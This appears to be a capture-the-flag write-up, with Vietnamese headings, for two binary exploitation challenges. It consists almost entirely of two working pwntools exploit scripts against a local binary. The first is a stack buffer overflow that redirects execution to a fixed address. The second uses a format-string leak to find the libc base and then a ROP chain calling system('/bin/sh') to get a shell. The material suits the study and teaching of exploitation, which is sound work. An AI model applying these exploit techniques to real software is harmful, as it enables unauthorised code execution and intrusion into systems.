# Challenge 2
-------
Script để exploit bài này:
```python
from pwn import *
elf = context.binary = ELF("./source")
r = elf.process()
gdb.attach(r, '''
    b* main+154\n
    c
''')
payload = b"a"*40 + p64(0x000000000040115e)
r.sendlineafter(b"login:", payload)

r.interactive()
```

# Challenge 3
------
Script để khai thác bài này:
```python
from pwn import *
elf = context.binary = ELF("./source")
r = elf.process()
libc = elf.libc

def send_book(payload:bytes):
    r.sendline(payload)
#############
# Leak Libc #
#############
r.sendline(b"4")
send_book(b"%19$p")
r.recvuntil(b"I can not find book: \n")
libc.address = int(r.recvline(),16) - 171408
log.success(f"LIBC Base: {hex(libc.address)}")
################
#  ROP gadget  #
################
pop_rdi_ret = 0x000000000002a3e5 + libc.address
ret = pop_rdi_ret + 1
system = libc.sym["system"]
binsh = next(libc.search(b"/bin/sh"))
###########
# Execute #
###########
r.sendline(b"4")
payload = b"a" * 56 + p64(ret) + p64(pop_rdi_ret) + p64(binsh) + p64(system)
send_book(payload)

r.interactive()
```